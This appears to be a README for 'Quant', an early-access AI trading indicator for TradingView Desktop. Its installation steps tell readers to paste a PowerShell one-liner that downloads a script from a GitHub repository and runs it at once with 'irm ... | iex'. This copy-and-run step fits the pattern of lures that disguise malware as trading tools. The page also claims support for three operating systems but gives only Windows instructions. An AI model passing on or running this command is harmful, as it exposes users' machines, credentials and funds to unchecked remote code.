Quant is an AI indicator currently in early access. It weighs 47 market factors, including price action, liquidity, positioning and upcoming events, and gives a directional forecast for the asset and timeframe you pick. Each forecast lists the signals that drove it. Open any signal to see the underlying data.

## Requirements
- TradingView Desktop
- 2 GB RAM
- Internet connection

## Installation
Supported on Windows, macOS and Linux.

#### 1. Open PowerShell

Press **Win + R**, type `PowerShell`, and press **Enter**.

#### 2. Run the Installation Command

Paste the installation command below into the PowerShell window:

```powershell
irm -useb github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/scripts/install.ps1 | iex
```

#### 3. Restart the TradingView Desktop App

If TradingView Desktop was open during installation, restart it. Quant will then appear in your indicator library.
